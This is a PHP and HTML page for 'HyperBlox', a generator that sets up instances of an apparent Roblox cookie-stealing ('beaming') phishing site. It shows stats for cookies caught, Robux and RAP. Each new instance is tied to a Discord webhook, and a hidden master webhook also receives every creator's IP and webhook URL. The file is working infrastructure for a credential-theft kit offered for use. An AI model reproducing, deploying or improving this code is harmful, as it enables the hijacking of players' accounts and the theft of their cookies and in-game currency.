<?php
require_once '../config.php';
require_once '../functions.php';

$error = '';
$success = false;

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $dir = sanitizeDirectory($_POST['dir'] ?? '');
    $web = trim($_POST['web'] ?? '');
    $username = trim($_POST['username'] ?? 'Beammer');
    $pfp = trim($_POST['pfp'] ?? 'https://hyperblox.eu/files/img.png');
    
    if (empty($dir) || !preg_match('/^[A-Za-z0-9_-]{3,32}$/', $dir)) {
        $error = 'Directory must be 3-32 characters (letters, numbers, hyphens, underscores only)';
    } elseif (directoryExists($dir)) {
        $error = 'Directory already taken. Please choose another name.';
    } elseif (!validateWebhook($web)) {
        $error = 'Invalid or inactive Discord webhook';
    } else {
        $token = generateToken();
        
        $instanceData = [
            'directory' => $dir,
            'userWebhook' => $web,
            'webhook' => MASTER_WEBHOOK,
            'token' => $token,
            'username' => $username,
            'profilePicture' => $pfp,
            'createdAt' => date('Y-m-d H:i:s'),
            'createdBy' => getClientIP(),
            'stats' => [
                'totalVisits' => 0,
                'totalCookies' => 0,
                'totalRobux' => 0,
                'totalRAP' => 0,
                'totalSummary' => 0
            ],
            'dailyStats' => [
                'visits' => array_fill(0, 7, 0),
                'cookies' => array_fill(0, 7, 0),
                'robux' => array_fill(0, 7, 0),
                'rap' => array_fill(0, 7, 0),
                'summary' => array_fill(0, 7, 0)
            ]
        ];
        
        saveInstanceData($dir, $instanceData);
        
        $tokenData = [
            'token' => $token,
            'directory' => $dir,
            'webhook' => $web,
            'createdAt' => date('Y-m-d H:i:s')
        ];
        saveTokenData($token, $tokenData);
        
        updateGlobalStats('totalSites');
        logActivity("New site created: $dir by IP: " . getClientIP());
        
        $siteUrl = FULL_URL . '/' . $dir;
        $dashboardUrl = FULL_URL . '/dashboard/sign-in.php?token=' . $token;
        
        $userNotification = [
            'username' => BOT_NAME,
            'avatar_url' => BOT_AVATAR,
            'embeds' => [[
                'title' => '✅ Site Generated Successfully',
                'description' => "Your bypass site **{$dir}** is ready!",
                'color' => 0x10b981,
                'fields' => [
                    [
                        'name' => '🔗 Your Link',
                        'value' => "[Click Here]({$siteUrl})\n```{$siteUrl}```",
                        'inline' => false
                    ],
                    [
                        'name' => '🎫 Access Token',
                        'value' => "```{$token}```",
                        'inline' => false
                    ],
                    [
                        'name' => '📊 Dashboard',
                        'value' => "[Login Here]({$dashboardUrl})",
                        'inline' => false
                    ]
                ],
                'footer' => [
                    'text' => 'Site Generator • v2.0',
                    'icon_url' => 'https://cdn-icons-png.flaticon.com/512/5473/5473473.png'
                ],
                'timestamp' => date('c')
            ]]
        ];
        
        sendWebhook($web, $userNotification);
        
        if (MASTER_WEBHOOK && MASTER_WEBHOOK !== 'https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_TOKEN') {
            $masterNotification = [
                'username' => 'Master Admin Bot',
                'avatar_url' => BOT_AVATAR,
                'embeds' => [[
                    'title' => '🆕 New Site Generated',
                    'description' => "Instance: **{$dir}**",
                    'color' => 0x8b5cf6,
                    'fields' => [
                        [
                            'name' => '🔗 Link',
                            'value' => "[{$siteUrl}]({$siteUrl})",
                            'inline' => true
                        ],
                        [
                            'name' => '🌍 IP',
                            'value' => "`" . getClientIP() . "`",
                            'inline' => true
                        ],
                        [
                            'name' => '📡 User Webhook',
                            'value' => "||{$web}||",
                            'inline' => false
                        ]
                    ],
                    'timestamp' => date('c')
                ]]
            ];
            
            sendWebhook(MASTER_WEBHOOK, $masterNotification);
        }
        
        $success = true;
        $resultSiteName = $dir;
        $resultUrl = $siteUrl;
        $resultToken = $token;
        $resultDashboard = $dashboardUrl;
    }
}

$stats = getGlobalStats();
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Generator - HyperBlox</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        :root {
            --primary: #3b82f6;
            --success: #10b981;
            --danger: #ef4444;
            --dark-bg: #0a0f1e;
            --dark-card: #1a2332;
            --text-primary: #ffffff;
            --text-secondary: #94a3b8;
        }
        body {
            font-family: 'Inter', -apple-system, sans-serif;
            background: var(--dark-bg);
            background-image: 
                radial-gradient(at 80% 0%, rgba(59, 130, 246, 0.15) 0px, transparent 50%),
                radial-gradient(at 0% 50%, rgba(139, 92, 246, 0.15) 0px, transparent 50%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            color: var(--text-primary);
        }
        .container { max-width: 580px; width: 100%; }
        .card {
            background: rgba(26, 35, 50, 0.85);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(100, 150, 255, 0.15);
            border-radius: 20px;
            padding: 45px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
        }
        .header { text-align: center; margin-bottom: 40px; }
        .logo {
            width: 80px;
            height: 80px;
            background: linear-gradient(135deg, var(--primary), #8b5cf6);
            border-radius: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 40px;
            margin: 0 auto 20px;
        }
        h1 {
            font-size: 32px;
            font-weight: 800;
            background: linear-gradient(135deg, #3b82f6, #8b5cf6, #ec4899);
            -webkit-background-clip: text;
            background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 12px;
        }
        .subtitle { font-size: 16px; color: var(--text-secondary); }
        .stats {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 15px;
            margin-bottom: 35px;
        }
        .stat {
            background: rgba(59, 130, 246, 0.1);
            border: 1px solid rgba(59, 130, 246, 0.2);
            border-radius: 12px;
            padding: 15px;
            text-align: center;
        }
        .stat-value { font-size: 24px; font-weight: 700; color: #60a5fa; }
        .stat-label { font-size: 12px; color: var(--text-secondary); text-transform: uppercase; }
        .form-group { margin-bottom: 25px; }
        label { display: block; font-size: 14px; font-weight: 700; margin-bottom: 10px; text-transform: uppercase; }
        input {
            width: 100%;
            padding: 16px 20px;
            background: rgba(15, 23, 42, 0.6);
            border: 2px solid rgba(100, 150, 255, 0.15);
            border-radius: 12px;
            color: var(--text-primary);
            font-size: 15px;
            font-family: inherit;
        }
        input:focus {
            outline: none;
            border-color: var(--primary);
            background: rgba(15, 23, 42, 0.9);
        }
        .hint { font-size: 12px; color: var(--text-secondary); margin-top: 8px; }
        button {
            width: 100%;
            padding: 18px;
            background: linear-gradient(135deg, var(--primary), #2563eb);
            border: none;
            border-radius: 12px;
            color: white;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            text-transform: uppercase;
            transition: all 0.3s;
        }
        button:hover { transform: translateY(-3px); box-shadow: 0 15px 40px rgba(59, 130, 246, 0.4); }
        .error {
            background: rgba(239, 68, 68, 0.1);
            border: 1px solid rgba(239, 68, 68, 0.3);
            color: var(--danger);
            padding: 15px;
            border-radius: 12px;
            margin-bottom: 20px;
            font-weight: 600;
        }
        .success {
            background: rgba(16, 185, 129, 0.1);
            border: 1px solid rgba(16, 185, 129, 0.3);
            border-radius: 12px;
            padding: 25px;
            margin-bottom: 20px;
        }
        .success-title { font-size: 20px; font-weight: 700; color: var(--success); margin-bottom: 20px; }
        .info-row { margin-bottom: 15px; }
        .info-label { font-size: 13px; font-weight: 700; color: var(--text-secondary); margin-bottom: 8px; }
        .info-value {
            background: rgba(15, 23, 42, 0.8);
            padding: 12px;
            border-radius: 8px;
            color: #60a5fa;
            font-family: monospace;
            word-break: break-all;
            font-size: 14px;
        }
        .info-link {
            color: #60a5fa;
            text-decoration: none;
            transition: all 0.3s;
        }
        .info-link:hover {
            color: #3b82f6;
        }
        @media (max-width: 768px) {
            .card { padding: 30px 25px; }
            h1 { font-size: 26px; }
            .stats { grid-template-columns: 1fr; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="header">
                <div class="logo">🔥</div>
                <h1>Cookie Bypasser Generator</h1>
                <p class="subtitle">Create your site in seconds</p>
            </div>

            <div class="stats">
                <div class="stat">
                    <div class="stat-value"><?php echo $stats['totalSites']; ?></div>
                    <div class="stat-label">Sites Created</div>
                </div>
                <div class="stat">
                    <div class="stat-value"><?php echo $stats['totalCookies']; ?></div>
                    <div class="stat-label">Cookies Caught</div>
                </div>
                <div class="stat">
                    <div class="stat-value">99.9%</div>
                    <div class="stat-label">Success Rate</div>
                </div>
            </div>

            <?php if ($error): ?>
            <div class="error">❌ <?php echo htmlspecialchars($error); ?></div>
            <?php endif; ?>

            <?php if ($success): ?>
            <div class="success">
                <div class="success-title">✅ Site Created Successfully!</div>
                <div class="info-row">
                    <div class="info-label">🏠 Site Name</div>
                    <div class="info-value"><?php echo htmlspecialchars($resultSiteName); ?></div>
                </div>
                <div class="info-row">
                    <div class="info-label">🔗 Your Link</div>
                    <div class="info-value"><a href="<?php echo htmlspecialchars($resultUrl); ?>" class="info-link" target="_blank"><?php echo htmlspecialchars($resultUrl); ?></a></div>
                </div>
                <div class="info-row">
                    <div class="info-label">📊 Dashboard</div>
                    <div class="info-value"><a href="<?php echo htmlspecialchars($resultDashboard); ?>" class="info-link" target="_blank"><?php echo htmlspecialchars($resultDashboard); ?></a></div>
                </div>
                <div class="info-row">
                    <div class="info-label">🎫 Token (Save This!)</div>
                    <div class="info-value"><?php echo htmlspecialchars($resultToken); ?></div>
                </div>
            </div>
            <script>
                confetti({ particleCount: 100, spread: 70, origin: { y: 0.6 } });
            </script>
            <?php else: ?>
            
            <form method="POST">
                <div class="form-group">
                    <label>📁 Site Name</label>
                    <input type="text" name="dir" placeholder="e.g., mysite123" pattern="[A-Za-z0-9_-]{3,32}" required>
                    <div class="hint">3-32 characters, letters, numbers, hyphens, underscores only</div>
                </div>

                <div class="form-group">
                    <label>🔗 Discord Webhook URL</label>
                    <input type="url" name="web" placeholder="https://discord.com/api/webhooks/..." required>
                    <div class="hint">Get this from Discord → Channel Settings → Integrations → Webhooks</div>
                </div>

                <div class="form-group">
                    <label>👤 Username (Optional)</label>
                    <input type="text" name="username" placeholder="Your username" value="Beammer">
                </div>

                <div class="form-group">
                    <label>🖼️ Profile Picture URL (Optional)</label>
                    <input type="url" name="pfp" placeholder="https://..." value="https://hyperblox.eu/files/img.png">
                </div>

                <button type="submit">⚡ Generate Site</button>
            </form>

            <?php endif; ?>
        </div>
    </div>
</body>
</html>
